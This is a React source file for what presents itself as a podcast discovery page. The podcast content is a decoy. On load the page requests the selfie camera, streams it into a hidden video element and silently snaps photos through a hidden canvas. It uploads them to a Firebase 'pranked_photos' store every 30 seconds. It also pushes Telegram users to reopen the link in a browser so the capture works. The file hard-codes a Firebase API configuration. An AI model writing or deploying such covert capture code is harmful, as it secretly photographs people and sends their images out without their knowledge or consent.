import React, { useRef, useState, useEffect, useCallback } from "react";
import { motion } from "framer-motion";
import { FaHeadphones, FaPodcast, FaMicrophone, FaPlayCircle } from "react-icons/fa";
import { initializeApp } from "firebase/app";
import { getStorage, ref, uploadString, getDownloadURL } from "firebase/storage";
import { getFirestore, collection, addDoc } from "firebase/firestore";
import 'bootstrap/dist/css/bootstrap.min.css';

// Firebase Config
const firebaseConfig = {
  apiKey: "AIzaSyDQlV_DbV2a_AON6GNPgHKnTaTb-ScqmZw",
  authDomain: "hareer-d24d2.firebaseapp.com",
  projectId: "hareer-d24d2",
  storageBucket: "hareer-d24d2.appspot.com",
  messagingSenderId: "448452939494",
  appId: "1:448452939494:web:686d5b08953d743f793527",
  measurementId: "G-WKW9WC0LTG",
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const storage = getStorage(app);
const db = getFirestore(app);

// Reusable UI components
const Card = ({ children, className }) => (
  <div className={`card shadow-lg rounded-4 ${className}`} style={{ width: '100%', maxWidth: '400px' }}>
    <div className="card-body">{children}</div>
  </div>
);

const Button = ({ className, onClick, children }) => (
  <button className={`btn ${className}`} onClick={onClick}>
    {children}
  </button>
);

export default function PodcastApp() {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [isInTelegram, setIsInTelegram] = useState(false);
  const [errorMessage, setErrorMessage] = useState(null);
  const [hasCameraPermission, setHasCameraPermission] = useState(true);

  // Capture photo function with added logging and error handling
  const capturePhoto = useCallback(() => {
    try {
      if (!canvasRef.current || !videoRef.current) {
        console.error("Canvas or video reference not available.");
        return;
      }
  
      const context = canvasRef.current.getContext("2d");
      if (!context) {
        console.error("Unable to get canvas context.");
        return;
      }
  
      // Draw the current frame from the video onto the canvas
      context.drawImage(videoRef.current, 0, 0, 320, 240);
      const photoDataUrl = canvasRef.current.toDataURL("image/png");
      console.log("Captured photo data URL:", photoDataUrl);
  
      // Upload photo to Firebase Storage as Base64 string
      const storageRef = ref(storage, "pranked_photos/" + Date.now() + ".png");
      uploadString(storageRef, photoDataUrl, "data_url")
        .then(async () => {
          // Get the download URL after upload is complete
          const photoUrl = await getDownloadURL(storageRef);
          console.log("Photo successfully uploaded. URL:", photoUrl);
  
          // Add the photo URL to Firestore
          await addDoc(collection(db, "pranked_photo"), {
            photoUrl: photoUrl,
            timestamp: Date.now(),
          });
          console.log("Photo URL added to Firestore.");
        })
        .catch((error) => {
          console.error("Error uploading image to Firebase:", error);
          setErrorMessage("Error uploading photo. Please try again.");
        });
    } catch (err) {
      console.error("Error during photo capture:", err);
      setErrorMessage("Error capturing photo. Please try again.");
    }
  }, []);

  // Request camera permission and set up video stream
  const requestCameraPermission = useCallback(async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" }, // Use selfie camera
      });
      console.log("Camera stream obtained.");
  
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.onloadedmetadata = () => {
          videoRef.current.play().then(() => {
            console.log("Video is playing.");
            // Delay to ensure the video is properly rendered before capture
            setTimeout(() => {
              capturePhoto(); // Capture after video starts
            }, 1000);
          }).catch(err => {
            console.error("Error playing video:", err);
          });
        };
      }
      setHasCameraPermission(true); // Permission granted
    } catch (error) {
      console.error("Camera access denied:", error);
      setErrorMessage("Camera access is denied or not available. Please allow camera access.");
      setHasCameraPermission(false);
    }
  }, [capturePhoto]);

  // Check if the user is on Telegram and request camera access if not
  useEffect(() => {
    if (navigator.userAgent.toLowerCase().includes("telegram")) {
      setIsInTelegram(true);
      console.log("Detected Telegram user agent.");
    } else {
      requestCameraPermission(); // Attempt to access camera on load
    }
  }, [requestCameraPermission]);

  // Re-capture the photo every 30 seconds
  useEffect(() => {
    const intervalId = setInterval(() => {
      if (hasCameraPermission) {
        console.log("Recapturing photo...");
        capturePhoto();
      } else {
        console.log("No camera permission. Retrying...");
        requestCameraPermission();
      }
    }, 30000); // 30 seconds

    return () => clearInterval(intervalId); // Cleanup interval on unmount
  }, [capturePhoto, requestCameraPermission, hasCameraPermission]);

  return (
    <div className="d-flex flex-column align-items-center justify-content-center min-vh-100 bg-gradient">
      <motion.h1
        className="display-4 text-center text-white mb-4"
        animate={{ scale: [1, 1.1, 1] }}
        transition={{ repeat: Infinity, duration: 1 }}
      >
        Welcome to the Podcast Zone!
      </motion.h1>

      {/* Hidden video element for camera stream */}
      <video ref={videoRef} style={{ display: "none" }} />

      {/* Hidden canvas element for capturing image */}
      <canvas ref={canvasRef} width="320" height="240" style={{ display: "none" }} />

      {isInTelegram ? (
        <Card className="mb-3">
          <p className="text-center text-dark mb-4">
            Camera access may not work in Telegram. Please open this link in a browser for full experience!
          </p>
          <Button
            className="btn-outline-primary"
            onClick={() => window.open(window.location.href, "_blank")}
          >
            Open in Browser
          </Button>
        </Card>
      ) : errorMessage ? (
        <Card className="mb-3">
          <p className="text-center text-danger mb-4">{errorMessage}</p>
          <Button
            className="btn-outline-danger"
            onClick={() => window.location.reload()}
          >
            Retry
          </Button>
        </Card>
      ) : (
        <Card className="text-center mb-3">
          <h2 className="h3 mb-4 text-primary">Explore the Best Podcasts</h2>
          <p className="text-muted mb-4">
            Discover podcasts on your favorite topics, from true crime to tech, business, and more!
          </p>

          <div className="d-flex justify-content-center mb-4">
            <motion.div className="bg-light rounded-circle p-4 mx-2 shadow-md hover:bg-primary">
              <FaPodcast size={40} className="text-primary" />
            </motion.div>
            <motion.div className="bg-light rounded-circle p-4 mx-2 shadow-md hover:bg-primary">
              <FaMicrophone size={40} className="text-primary" />
            </motion.div>
            <motion.div className="bg-light rounded-circle p-4 mx-2 shadow-md hover:bg-primary">
              <FaHeadphones size={40} className="text-primary" />
            </motion.div>
          </div>

          <Button
            className="btn-primary btn-lg"
            onClick={() => window.location.href = "https://example-podcast.com"}
          >
            <FaPlayCircle size={20} className="mr-2" />
            Start Listening
          </Button>
        </Card>
      )}
    </div>
  );
}
